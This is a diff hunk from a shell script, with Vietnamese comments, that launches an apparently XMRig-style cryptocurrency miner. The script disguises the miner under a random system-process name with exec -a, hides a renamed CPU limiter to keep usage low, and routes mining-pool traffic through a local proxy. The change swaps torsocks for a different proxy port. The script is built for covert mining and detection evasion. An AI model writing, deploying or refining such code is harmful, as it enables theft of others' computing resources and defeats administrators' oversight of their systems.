@@ -78,7 +78,7 @@ CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))
 
 # Sử dụng Wrapper Process để bọc tiến trình
 echo "Starting the process disguised as: $FINAL_NAME and cpulimit: $CPULIMIT_NAME (wrapped under the system process: $RANDOM_SYSTEM_PROCESS)"
-sudo -u nobody bash -c "exec -a $RANDOM_SYSTEM_PROCESS /usr/bin/$CPULIMIT_NAME -l $CPU_LIMIT -- taskset -c $CORE_SET torsocks /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050"
+sudo -u nobody bash -c "exec -a $RANDOM_SYSTEM_PROCESS /usr/bin/$CPULIMIT_NAME -l $CPU_LIMIT -- taskset -c $CORE_SET /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:8118"
 
 # Giữ tiến trình chạy
 tail -f /dev/null
